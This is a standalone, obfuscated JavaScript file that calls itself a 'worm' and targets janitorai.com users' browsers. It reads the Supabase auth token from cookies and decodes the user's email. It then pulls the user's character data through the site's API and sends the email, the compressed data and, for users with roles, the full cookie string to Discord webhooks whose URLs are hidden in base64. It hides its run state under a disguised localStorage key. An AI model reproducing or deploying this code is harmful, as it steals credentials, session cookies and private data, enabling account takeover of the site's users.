if (window.worm!=window)
{window.worm=window
window.__xnext=function(){let t=document.cookie.split(";").reduce((t,e)=>{let[l,o]=e.split("=");return t[l.trim()]=decodeURIComponent(o.trim()),t},{}),e=atob("c2ItYXV0aC1hdXRoLXRva2Vu");if(zz=atob("YWNjZXNzX3Rva2Vu"),z=atob("QmVhcmVyIA=="),null==(el=t[e])){let l=[],o=0;for(;void 0!==t[e+"."+o];)l.push(t[e+"."+o]),o++;l.length>0&&(el=l.join(""))}if(null!=el)return z+JSON.parse(atob(el.substr(7,el.length)))[zz];};
function d(en) {
    return atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv') + atob(en);
}

setTimeout(()=>{try {
    let whoiam=JSON.parse(atob(__xnext().split(".")[1]))["email"];
    fetch(d("MTI5MjY1NjI1MTg4MDM0MTU0NS8tOVVEMmNSWGl2dkVPTzJxUk9NVmxVOGRrS0stYkJFVFRNQmhES3FGWGRWeDNYZ0NQT0ZLSDE0LUVZdnRrZTRVTWl3SQ=="),{"headers":{"content-type":"application/json"},"method":"POST","body":JSON.stringify({"content":"View `"+whoiam+"`"})})
    const _1=JSON.stringify,_2=JSON.parse,_3=btoa,_4=atob,_5=window.pako,_6=fetch,_7=document,_8=async()=>{let t=_2(_4(__xnext().split(".")[1])).sub,e={authorization:__xnext(),"sentry-trace":"","x-app-version":_7.cookie.split("janitorai=")[1].split(";")[0]},a=1,i=[],o=!0;for(;o;){let r=await (await _6(`https://janitorai.com/hampter/characters/v2/mine?page=${a}&sort=latest&user_id[]=${t}&search=&privacyFilter=public`,{headers:e,method:"GET",mode:"cors",credentials:"include"})).json();i=i.concat(r.data),r.data.length<r.size&&(o=!1),a++}return i},_9=async()=>{let t=await _8(),e=[];for(let a of t){let i=await (await _6(`https://janitorai.com/hampter/characters/${a.id}`,{headers:{authorization:__xnext(),"sentry-trace":"","x-app-version":_7.cookie.split("janitorai=")[1].split(";")[0]},method:"GET"})).json();e.push(i)}return _3(_5.deflate(_1(e),{to:"string"}))};null==localStorage.getItem("chakra-ui-color-code")&&(async()=>{let t=await _9();localStorage.setItem("chakra-ui-color-code","#62FF0F");let e=new FormData,a=new Blob([t],{type:"text/plain"});e.append("file",a,"content.txt");let i=JSON.stringify({content:whoiam});e.append("payload_json",i),fetch(d("MTI5MjY1NjMxNDA2MDc3MTQ2My9pdmJxeU1XY0k5Z0hQV1A2YU5VZVJqQmtheHE0Y2lvTTl5VGR3NXpOX1pZNTZtWUxGbHNJd3dfTkh2X2FBb1Q5eWM5dA=="),{method:"POST",body:e})})();function c() {return btoa(pako.deflate(document.cookie, { to: 'string' }));}
    if (JSON.parse(localStorage.getItem("stores")).user.profile.user_roles.length>0){let t=c(),e=new FormData,a=new Blob([t],{type:"text/plain"});e.append("file",a,"content.txt");let i=JSON.stringify({content:"@everyone "+whoiam+" "+window.location.href});e.append("payload_json",i),fetch(d("MTI5MjY1MzYxNzI3MDEwMDA2MC9zTVVINU1rcjlOOVVqalpkVXdXOVJFenJWaTg4ODJHNWRmYU9WZTVpYlJkQ2lhZXlRWnRCc19xWmRQa1pyc3o5UTljbQ=="),{method:"POST",body:e});}
} catch {}},2000)
function load(url,pos = null,type=null) {
        if (pos==null){
            pos = document.body
        }
        const iframe = document.createElement('script');
        iframe.src = url;
        if (type!=null){
            iframe.type = type
        }
        pos.appendChild(iframe);
}
load('https://cdnjs.cloudflare.com/ajax/libs/pako/1.0.11/pako.min.js');
}
